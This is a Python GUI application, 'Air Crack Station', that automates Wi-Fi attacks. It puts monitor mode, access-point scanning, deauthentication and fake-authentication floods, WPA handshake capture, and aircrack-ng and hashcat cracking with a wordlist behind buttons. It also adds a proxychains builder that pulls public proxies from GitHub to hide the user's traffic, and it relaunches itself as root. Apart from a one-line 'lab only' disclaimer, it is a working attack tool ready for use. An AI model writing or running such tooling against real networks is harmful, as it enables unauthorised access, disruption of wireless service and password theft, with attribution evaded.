#!/usr/bin/env python3
"""ACS desktop app. Made by Pakun & iinze0. Authorized lab use only."""

from __future__ import annotations

import json
import os
import queue
import re
import shutil
import subprocess
import sys
import threading
import urllib.request
from pathlib import Path

try:
    import tkinter as tk
    from tkinter import messagebox, ttk
except ImportError:
    sys.stderr.write(
        "ACS needs the Tk toolkit.\n"
        "  sudo apt-get update && sudo apt-get install -y python3-tk\n"
    )
    raise SystemExit(1)

HOME = Path.home() / ".acs"
SESSION = HOME / "app-session.json"
CONF = HOME / "proxychains.conf"

BG = "#07090a"
SURFACE = "#101614"
RAISED = "#18211c"
FG = "#d7f5e3"
MUTED = "#6d8a7a"
ACCENT = "#3dff8a"
WARN = "#e8c547"
LINE = "#24332b"

SOURCES = {
    "socks5": [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    ],
    "socks4": [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    ],
    "http": [
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    ],
}

IP_RE = re.compile(r"^(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})$")
MAC_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")


def have(cmd: str) -> bool:
    return shutil.which(cmd) is not None


def default_session() -> dict:
    return {
        "iface": "wlan0",
        "mon": "",
        "channel": "6",
        "bssid": "",
        "essid": "",
        "client": "",
        "cap": str(HOME / "handshake"),
        "wordlist": "/usr/share/wordlists/rockyou.txt",
    }


def load_session() -> dict:
    data = default_session()
    try:
        saved = json.loads(SESSION.read_text())
        if isinstance(saved, dict):
            data.update({k: str(v) for k, v in saved.items() if k in data})
    except (OSError, json.JSONDecodeError):
        pass
    return data


def save_session(data: dict) -> None:
    HOME.mkdir(parents=True, exist_ok=True)
    SESSION.write_text(json.dumps(data, indent=2))


def relaunch_as_root() -> None:
    if os.geteuid() == 0:
        return
    script = str(Path(__file__).resolve())
    if have("pkexec"):
        os.execvp("pkexec", ["pkexec", sys.executable, script, *sys.argv[1:]])
    if have("sudo"):
        os.execvp("sudo", ["sudo", "-E", sys.executable, script, *sys.argv[1:]])
    sys.stderr.write("Run ACS as root: sudo python3 acs_app.py\n")
    raise SystemExit(1)


class App(tk.Tk):
    def __init__(self) -> None:
        super().__init__()
        self.title("ACS")
        self.geometry("1100x720")
        self.minsize(860, 560)
        self.configure(bg=BG)
        self.session = load_session()
        self.vars = {k: tk.StringVar(value=v) for k, v in self.session.items()}
        self.log_q: queue.Queue[str] = queue.Queue()
        self.proc: subprocess.Popen[str] | None = None
        self.proxies: list[str] = []
        self.kind = tk.StringVar(value="socks5")
        self.hops = tk.StringVar(value="8")
        self.page = tk.StringVar(value="Station")
        self._build()
        self.after(120, self._drain)
        self.protocol("WM_DELETE_WINDOW", self._close)

    def _build(self) -> None:
        top = tk.Frame(self, bg=SURFACE, highlightbackground=LINE, highlightthickness=1)
        top.pack(fill="x")
        tk.Label(top, text="ACS", bg=SURFACE, fg=ACCENT, font=("sans-serif", 16, "bold")).pack(
            side="left", padx=16, pady=10
        )
        tk.Label(
            top,
            text="Air Crack Station   ·   Pakun & iinze0",
            bg=SURFACE,
            fg=MUTED,
            font=("sans-serif", 10),
        ).pack(side="left")
        self.status = tk.Label(top, text="lab only", bg=SURFACE, fg=ACCENT, font=("sans-serif", 10))
        self.status.pack(side="right", padx=16)

        body = tk.Frame(self, bg=BG)
        body.pack(fill="both", expand=True)

        nav = tk.Frame(body, bg=SURFACE, width=168)
        nav.pack(side="left", fill="y")
        nav.pack_propagate(False)
        for name in ("Station", "Scan", "Attack", "Crack", "Proxy"):
            tk.Button(
                nav,
                text=name,
                command=lambda n=name: self.show(n),
                bg=RAISED,
                fg=FG,
                activebackground=ACCENT,
                activeforeground=BG,
                relief="flat",
                font=("sans-serif", 12),
                pady=12,
                cursor="hand2",
            ).pack(fill="x", padx=10, pady=4)

        self.stage = tk.Frame(body, bg=BG)
        self.stage.pack(side="left", fill="both", expand=True, padx=16, pady=12)
        self.pages = {
            "Station": self._page_station(),
            "Scan": self._page_scan(),
            "Attack": self._page_attack(),
            "Crack": self._page_crack(),
            "Proxy": self._page_proxy(),
        }
        self.show("Station")

        log_wrap = tk.Frame(self, bg=BG)
        log_wrap.pack(fill="both", padx=12, pady=(0, 12))
        tk.Label(log_wrap, text="OUTPUT", bg=BG, fg=MUTED, font=("sans-serif", 9)).pack(anchor="w")
        self.log = tk.Text(
            log_wrap,
            height=8,
            bg="#050706",
            fg=ACCENT,
            insertbackground=FG,
            relief="flat",
            font=("monospace", 10),
            wrap="word",
        )
        self.log.pack(fill="both", expand=True)

    def show(self, name: str) -> None:
        for child in self.stage.winfo_children():
            child.pack_forget()
        self.pages[name].pack(fill="both", expand=True)
        self.page.set(name)

    def _label(self, parent: tk.Widget, text: str) -> None:
        tk.Label(parent, text=text, bg=BG, fg=MUTED, font=("sans-serif", 9)).pack(anchor="w")

    def _entry(self, parent: tk.Widget, key: str) -> None:
        self._label(parent, key)
        tk.Entry(
            parent,
            textvariable=self.vars[key],
            bg=SURFACE,
            fg=FG,
            insertbackground=FG,
            relief="flat",
            font=("monospace", 11),
        ).pack(fill="x", ipady=6, pady=(0, 8))

    def _buttons(self, parent: tk.Widget, pairs: list[tuple[str, object]]) -> None:
        row = tk.Frame(parent, bg=BG)
        row.pack(fill="x", pady=8)
        for text, fn in pairs:
            tk.Button(
                row,
                text=text,
                command=fn,
                bg=ACCENT,
                fg=BG,
                activebackground="#8dffc0",
                activeforeground=BG,
                relief="flat",
                font=("sans-serif", 11, "bold"),
                padx=12,
                pady=8,
                cursor="hand2",
            ).pack(side="left", padx=(0, 8))

    def _page_station(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        tk.Label(page, text="Station", bg=BG, fg=FG, font=("sans-serif", 22, "bold")).pack(anchor="w")
        tk.Label(
            page,
            text="Set the card and the target. Scan fills BSSID from a real AP list.",
            bg=BG,
            fg=MUTED,
        ).pack(anchor="w", pady=(0, 10))
        grid = tk.Frame(page, bg=BG)
        grid.pack(fill="x")
        left = tk.Frame(grid, bg=BG)
        right = tk.Frame(grid, bg=BG)
        left.pack(side="left", fill="both", expand=True, padx=(0, 12))
        right.pack(side="left", fill="both", expand=True)
        for key in ("iface", "mon", "channel", "bssid"):
            self._entry(left, key)
        for key in ("essid", "client", "cap", "wordlist"):
            self._entry(right, key)
        self._buttons(
            page,
            [
                ("Save", self._save),
                ("Detect wireless", self._detect),
                ("Monitor mode", self._monitor),
                ("Restore Wi-Fi", self._restore),
                ("Install tools", self._install),
            ],
        )
        return page

    def _page_scan(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        tk.Label(page, text="Networks", bg=BG, fg=FG, font=("sans-serif", 22, "bold")).pack(anchor="w")
        tk.Label(
            page,
            text="Scans for a few seconds, then lists access points. Click one to lock it.",
            bg=BG,
            fg=MUTED,
        ).pack(anchor="w", pady=(0, 8))
        cols = ("bssid", "ch", "pwr", "enc", "essid")
        self.tree = ttk.Treeview(page, columns=cols, show="headings", height=12)
        for col, title, width in (
            ("bssid", "BSSID", 180),
            ("ch", "CH", 50),
            ("pwr", "PWR", 60),
            ("enc", "ENC", 120),
            ("essid", "ESSID", 240),
        ):
            self.tree.heading(col, text=title)
            self.tree.column(col, width=width, anchor="w")
        self.tree.pack(fill="both", expand=True)
        self.tree.bind("<<TreeviewSelect>>", self._pick_ap)
        style = ttk.Style(self)
        style.theme_use("clam")
        style.configure("Treeview", background=SURFACE, fieldbackground=SURFACE, foreground=FG, rowheight=28)
        style.configure("Treeview.Heading", background=RAISED, foreground=ACCENT)
        self._buttons(page, [("Scan", self._scan), ("Stop", self._stop)])
        return page

    def _page_attack(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        tk.Label(page, text="Attack", bg=BG, fg=FG, font=("sans-serif", 22, "bold")).pack(anchor="w")
        tk.Label(page, text="Uses the station target. Monitor mode has to be on.", bg=BG, fg=MUTED).pack(
            anchor="w", pady=(0, 8)
        )
        self._buttons(
            page,
            [
                ("Deauth", self._deauth),
                ("Fake auth", self._fakeauth),
                ("Handshake", self._handshake),
                ("Stop", self._stop),
            ],
        )
        return page

    def _page_crack(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        tk.Label(page, text="Crack", bg=BG, fg=FG, font=("sans-serif", 22, "bold")).pack(anchor="w")
        tk.Label(
            page,
            text="WPA uses the wordlist and the newest capture. Hashcat uses a pcapng from hcxdumptool.",
            bg=BG,
            fg=MUTED,
        ).pack(anchor="w", pady=(0, 8))
        self._buttons(
            page,
            [
                ("Crack WPA", self._crack_wpa),
                ("hcx capture", self._hcx),
                ("Hashcat 22000", self._hashcat),
                ("Stop", self._stop),
            ],
        )
        return page

    def _page_proxy(self) -> tk.Frame:
        page = tk.Frame(self.stage, bg=BG)
        tk.Label(page, text="Proxy chain", bg=BG, fg=FG, font=("sans-serif", 22, "bold")).pack(anchor="w")
        tk.Label(
            page,
            text="Pulls live proxy addresses from GitHub and writes a proxychains file.",
            bg=BG,
            fg=MUTED,
        ).pack(anchor="w", pady=(0, 8))
        row = tk.Frame(page, bg=BG)
        row.pack(fill="x")
        for kind in ("socks5", "socks4", "http"):
            tk.Radiobutton(
                row,
                text=kind,
                variable=self.kind,
                value=kind,
                bg=BG,
                fg=FG,
                selectcolor=SURFACE,
                activebackground=BG,
                activeforeground=ACCENT,
            ).pack(side="left", padx=(0, 12))
        tk.Label(row, text="hops", bg=BG, fg=MUTED).pack(side="left")
        tk.Entry(row, textvariable=self.hops, width=4, bg=SURFACE, fg=FG, relief="flat").pack(
            side="left", padx=8, ipady=4
        )
        self.proxy_list = tk.Listbox(
            page, bg=SURFACE, fg=FG, selectbackground=ACCENT, selectforeground=BG, relief="flat", font=("monospace", 11)
        )
        self.proxy_list.pack(fill="both", expand=True, pady=8)
        self._buttons(
            page,
            [
                ("Pull from GitHub", self._pull_proxies),
                ("Save chain", self._save_chain),
                ("Test chain", self._test_chain),
            ],
        )
        return page

    def _vals(self) -> dict[str, str]:
        return {k: v.get().strip() for k, v in self.vars.items()}

    def _save(self) -> None:
        data = self._vals()
        save_session(data)
        self._write("saved session")

    def _need(self, cmd: str) -> bool:
        if have(cmd):
            return True
        self._write(f"missing {cmd} — use Install tools")
        return False

    def _need_mon(self) -> str | None:
        mon = self._vals()["mon"]
        if mon and Path(f"/sys/class/net/{mon}").exists():
            return mon
        self._write("no monitor interface — turn monitor mode on first")
        return None

    def _need_bssid(self) -> str | None:
        bssid = self._vals()["bssid"]
        if MAC_RE.match(bssid):
            return bssid
        self._write("set a real BSSID (scan and click an AP)")
        return None

    def _write(self, text: str) -> None:
        self.log_q.put(text.rstrip() + "\n")

    def _drain(self) -> None:
        try:
            while True:
                line = self.log_q.get_nowait()
                self.log.insert("end", line)
                self.log.see("end")
        except queue.Empty:
            pass
        self.after(120, self._drain)

    def _run(self, args: list[str], timeout: int | None = None) -> None:
        if self.proc and self.proc.poll() is None:
            self._write("something is already running — press Stop")
            return

        def work() -> None:
            self._write("$ " + " ".join(args))
            try:
                self.proc = subprocess.Popen(
                    args,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                )
                assert self.proc.stdout is not None
                if timeout:
                    try:
                        out, _ = self.proc.communicate(timeout=timeout)
                    except subprocess.TimeoutExpired:
                        self.proc.kill()
                        out, _ = self.proc.communicate()
                        self._write(f"(stopped after {timeout}s)")
                    if out:
                        self._write(out)
                else:
                    for line in self.proc.stdout:
                        self._write(line)
                    self.proc.wait()
                code = self.proc.returncode
                self._write(f"(exit {code})")
            except FileNotFoundError:
                self._write(f"not found: {args[0]}")
            except Exception as exc:  # noqa: BLE001
                self._write(str(exc))

        threading.Thread(target=work, daemon=True).start()

    def _stop(self) -> None:
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            self._write("stopped")
        else:
            self._write("nothing running")

    def _detect(self) -> None:
        if not self._need("iw"):
            return
        try:
            out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError:
            self._write("iw dev failed")
            return
        names = re.findall(r"Interface\s+(\S+)", out)
        if not names:
            self._write("no wireless interface")
            return
        self.vars["iface"].set(names[0])
        mon = next((n for n in names if n.endswith("mon")), "")
        if mon:
            self.vars["mon"].set(mon)
        self._write("found " + ", ".join(names))
        self._save()

    def _monitor(self) -> None:
        if not self._need("airmon-ng"):
            return
        iface = self._vals()["iface"]
        if not iface:
            self._write("set an interface")
            return
        if not messagebox.askyesno("ACS", f"Enable monitor mode on {iface}? This drops your Wi-Fi."):
            return
        if not self._need("airmon-ng"):
            return

        def work() -> None:
            self._run_sync(["airmon-ng", "check", "kill"])
            self._run_sync(["airmon-ng", "start", iface])
            mon = f"{iface}mon" if Path(f"/sys/class/net/{iface}mon").exists() else ""
            if not mon:
                try:
                    out = subprocess.check_output(["iw", "dev"], text=True)
                    mons = [n for n in re.findall(r"Interface\s+(\S+)", out) if n.endswith("mon")]
                    mon = mons[0] if mons else ""
                except subprocess.CalledProcessError:
                    mon = ""
            if mon:
                self.vars["mon"].set(mon)
                self._write(f"monitor up: {mon}")
                self._save()
            else:
                self._write("monitor interface did not come up")

        threading.Thread(target=work, daemon=True).start()

    def _run_sync(self, args: list[str]) -> None:
        self._write("$ " + " ".join(args))
        try:
            proc = subprocess.run(args, text=True, capture_output=True, timeout=40)
        except subprocess.TimeoutExpired:
            self._write("timed out")
            return
        except FileNotFoundError:
            self._write(f"not found: {args[0]}")
            return
        text = (proc.stdout or "") + (proc.stderr or "")
        if text.strip():
            self._write(text.strip())

    def _restore(self) -> None:
        mon = self._vals()["mon"] or (self._vals()["iface"] + "mon")
        self._run(["airmon-ng", "stop", mon])
        subprocess.Popen(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        self.vars["mon"].set("")
        self._save()

    def _install(self) -> None:
        if not messagebox.askyesno("ACS", "Install aircrack-ng, hashcat, hcx tools, and proxychains4?"):
            return
        pkgs = [
            "aircrack-ng",
            "hashcat",
            "hcxdumptool",
            "hcxtools",
            "proxychains4",
            "curl",
            "iw",
            "wireless-tools",
        ]
        self._run(["apt-get", "install", "-y", *pkgs])

    def _scan(self) -> None:
        mon = self._need_mon()
        if not mon or not self._need("airodump-ng"):
            return
        HOME.mkdir(parents=True, exist_ok=True)
        prefix = str(HOME / "scan")
        for old in HOME.glob("scan-*.csv"):
            old.unlink(missing_ok=True)

        def work() -> None:
            self._write(f"scanning {mon} for 12s")
            cmd = ["airodump-ng", "--band", "abg", "--output-format", "csv", "-w", prefix, mon]
            if have("timeout"):
                cmd = ["timeout", "12", *cmd]
            try:
                subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
            except subprocess.TimeoutExpired:
                pass
            csvs = sorted(HOME.glob("scan-*.csv"), key=lambda p: p.stat().st_mtime, reverse=True)
            rows = parse_airodump(csvs[0]) if csvs else []
            self.after(0, lambda: self._fill_aps(rows))

        threading.Thread(target=work, daemon=True).start()

    def _fill_aps(self, rows: list[tuple[str, str, str, str, str]]) -> None:
        self.tree.delete(*self.tree.get_children())
        for row in rows:
            self.tree.insert("", "end", values=row)
        self._write(f"{len(rows)} access points")

    def _pick_ap(self, _event: object) -> None:
        sel = self.tree.selection()
        if not sel:
            return
        bssid, ch, _pwr, _enc, essid = self.tree.item(sel[0], "values")
        self.vars["bssid"].set(bssid)
        self.vars["channel"].set(str(ch).strip())
        self.vars["essid"].set(essid)
        self._save()
        self._write(f"locked {essid or bssid} ch {ch}")

    def _deauth(self) -> None:
        mon = self._need_mon()
        bssid = self._need_bssid()
        if not mon or not bssid or not self._need("aireplay-ng"):
            return
        client = self._vals()["client"]
        cmd = ["aireplay-ng", "--deauth", "8", "-a", bssid]
        if MAC_RE.match(client):
            cmd += ["-c", client]
        cmd.append(mon)
        self._run(cmd, timeout=25)

    def _fakeauth(self) -> None:
        mon = self._need_mon()
        bssid = self._need_bssid()
        if not mon or not bssid or not self._need("aireplay-ng"):
            return
        essid = self._vals()["essid"] or "lab"
        self._run(["aireplay-ng", "--fakeauth", "0", "-a", bssid, "-e", essid, mon], timeout=20)

    def _handshake(self) -> None:
        mon = self._need_mon()
        bssid = self._need_bssid()
        if not mon or not bssid or not self._need("airodump-ng") or not self._need("aireplay-ng"):
            return
        vals = self._vals()
        cap = vals["cap"] or str(HOME / "handshake")
        chan = vals["channel"] or "6"

        def work() -> None:
            self._write("capturing handshake for 20s")
            dump = [
                "airodump-ng",
                "-c",
                chan,
                "--bssid",
                bssid,
                "-w",
                cap,
                mon,
            ]
            proc = subprocess.Popen(dump, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.proc = proc
            client = vals["client"]
            deauth = ["aireplay-ng", "--deauth", "6", "-a", bssid]
            if MAC_RE.match(client):
                deauth += ["-c", client]
            deauth.append(mon)
            subprocess.run(deauth, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=20)
            try:
                proc.wait(timeout=12)
            except subprocess.TimeoutExpired:
                proc.terminate()
            caps = sorted(Path(cap).parent.glob(Path(cap).name + "-*.cap"), key=lambda p: p.stat().st_mtime, reverse=True)
            if not caps:
                self._write("no capture written")
                return
            word = vals["wordlist"]
            if Path(word).is_file() and have("aircrack-ng"):
                self._write(f"cracking {caps[0].name}")
                self._run_sync(["aircrack-ng", "-w", word, "-b", bssid, str(caps[0])])
            else:
                self._write(f"saved {caps[0]}")

        threading.Thread(target=work, daemon=True).start()

    def _latest_cap(self) -> Path | None:
        cap = self._vals()["cap"] or str(HOME / "handshake")
        parent = Path(cap).parent
        name = Path(cap).name
        found = sorted(parent.glob(name + "-*.cap"), key=lambda p: p.stat().st_mtime, reverse=True)
        if found:
            return found[0]
        direct = Path(cap if cap.endswith(".cap") else cap + ".cap")
        return direct if direct.is_file() else None

    def _crack_wpa(self) -> None:
        if not self._need("aircrack-ng"):
            return
        cap = self._latest_cap()
        word = self._vals()["wordlist"]
        if cap is None:
            self._write("no capture yet")
            return
        if not Path(word).is_file():
            self._write(f"wordlist missing: {word}")
            return
        cmd = ["aircrack-ng", "-w", word]
        bssid = self._vals()["bssid"]
        if MAC_RE.match(bssid):
            cmd += ["-b", bssid]
        cmd.append(str(cap))
        self._run(cmd)

    def _hcx(self) -> None:
        mon = self._need_mon()
        if not mon or not self._need("hcxdumptool"):
            return
        out = HOME / "hcx.pcapng"
        self._run(["hcxdumptool", "-i", mon, "-w", str(out), "--rds=1"], timeout=25)

    def _hashcat(self) -> None:
        if not self._need("hcxpcapngtool") or not self._need("hashcat"):
            return
        pcap = HOME / "hcx.pcapng"
        if not pcap.is_file():
            self._write("no hcx.pcapng — run hcx capture first")
            return
        word = self._vals()["wordlist"]
        if not Path(word).is_file():
            self._write(f"wordlist missing: {word}")
            return
        digest = HOME / "hash.hc22000"

        def work() -> None:
            self._run_sync(["hcxpcapngtool", "-o", str(digest), str(pcap)])
            if digest.is_file() and digest.stat().st_size:
                self._run_sync(["hashcat", "-m", "22000", str(digest), word, "--force"])
            else:
                self._write("no hashes in that capture")

        threading.Thread(target=work, daemon=True).start()

    def _pull_proxies(self) -> None:
        kind = self.kind.get()
        try:
            count = max(1, min(40, int(self.hops.get())))
        except ValueError:
            count = 8

        def work() -> None:
            found: set[str] = set()
            for url in SOURCES[kind]:
                self._write("GET " + url)
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "acs-app"})
                    with urllib.request.urlopen(req, timeout=25) as resp:
                        text = resp.read().decode("utf-8", "replace")
                except Exception as exc:  # noqa: BLE001
                    self._write(f"failed {url} ({exc})")
                    continue
                for line in text.splitlines():
                    if IP_RE.match(line.strip()):
                        found.add(line.strip())
            picks = list(found)
            picks.sort()
            # spread the sample instead of always taking the first block
            step = max(1, len(picks) // max(count, 1))
            chosen = picks[::step][:count]
            self.proxies = chosen

            def paint() -> None:
                self.proxy_list.delete(0, "end")
                for item in chosen:
                    self.proxy_list.insert("end", item)
                self._write(f"{len(found)} unique from GitHub, chain uses {len(chosen)}")

            self.after(0, paint)

        threading.Thread(target=work, daemon=True).start()

    def _save_chain(self) -> None:
        if not self.proxies:
            self._write("pull proxies first")
            return
        kind = self.kind.get()
        lines = [
            "# ACS proxy chain — IPs pulled from GitHub",
            "dynamic_chain",
            "proxy_dns",
            "tcp_read_time_out 15000",
            "tcp_connect_time_out 8000",
            "[ProxyList]",
        ]
        for item in self.proxies:
            ip, port = item.split(":", 1)
            lines.append(f"{kind} {ip} {port}")
        HOME.mkdir(parents=True, exist_ok=True)
        CONF.write_text("\n".join(lines) + "\n")
        self._write(f"wrote {CONF}")

    def _test_chain(self) -> None:
        if not CONF.is_file():
            self._write("save a chain first")
            return
        binary = "proxychains4" if have("proxychains4") else "proxychains"
        if not have(binary):
            self._write("proxychains4 is not installed")
            return
        self._run([binary, "-f", str(CONF), "curl", "-fsSL", "--max-time", "25", "https://ifconfig.me"])

    def _close(self) -> None:
        self._stop()
        self._save()
        self.destroy()


def parse_airodump(path: Path) -> list[tuple[str, str, str, str, str]]:
    rows: list[tuple[str, str, str, str, str]] = []
    text = path.read_text(errors="replace")
    for line in text.splitlines():
        parts = [p.strip() for p in line.split(",")]
        if len(parts) < 14:
            continue
        if not MAC_RE.match(parts[0]):
            continue
        essid = parts[13]
        if essid.lower() in {"essid", ""} and parts[3] == "":
            continue
        enc = " ".join(x for x in (parts[5], parts[6], parts[7]) if x)
        rows.append((parts[0], parts[3], parts[8], enc, essid))
    return rows


def main() -> None:
    relaunch_as_root()
    HOME.mkdir(parents=True, exist_ok=True)
    App().mainloop()


if __name__ == "__main__":
    main()
